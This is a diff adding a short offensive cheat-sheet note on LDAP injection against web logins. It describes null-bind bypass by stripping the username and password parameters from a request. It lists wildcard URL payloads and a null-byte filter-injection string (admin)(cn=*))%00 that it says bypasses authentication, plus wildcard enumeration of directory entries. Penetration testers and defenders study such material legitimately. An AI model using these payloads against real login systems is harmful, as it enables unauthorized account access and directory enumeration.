@@ -1,0 +1,37 @@
+LDAP injection
+	Some LDAP servers authorize NULL Bind: if null values are sent, the LDAP server 
+	will proceed to bind the connection, and the PHP code will think that the 
+	credentials are correct. To get the bind with 2 null values, you will need to 
+	completely remove the parameter from the query. If you keep something like 
+	username=&password= in the URL, these values will not work, since they won't be 
+	null; instead, they will be empty.  So, completely remove the username=&password=
+	options.
+	
+	Examples in URL:
+		http://site.org/example.php?name=*&password=hacker
+		http://site.org/example.php?name=dude&password=*
+
+
+
+	When logging in to a site using LDAP try removing the username=jimmy&password=blah 
+	from the POST body and resubmit the request. In some instances the LDAP service
+	will allow the authentication to happen
+
+
+
+	Typical login uses boolean OR or boolean AND logic:
+		OR	|: (|(cn=[INPUT1])(cn=[INPUT2])) to get records matching [INPUT1] or [INPUT2].
+		AND	&: (&(cn=[INPUT1])(userPassword=[INPUT2])) to get records for which the cn matches 
+				[INPUT1] and password matches [INPUT2]	
+
+		So, in the AND case it would look something like this:
+			(&(cn=admin)(userPassword=admin))
+			http://site.com/name=admin&password=admin
+
+		To inject this so we don't have to authenticate we can do this:
+			(&(cn=admin)(cn=*))%00)(userPassword=admin))
+			http://site.com/name=admin)(cn=*))%00&password=whatever
+				that should auth bypass
+
+			Further you can change the name= to name=* to auth as
+			first entry in LDAP db or first a entry name=a* , etc.
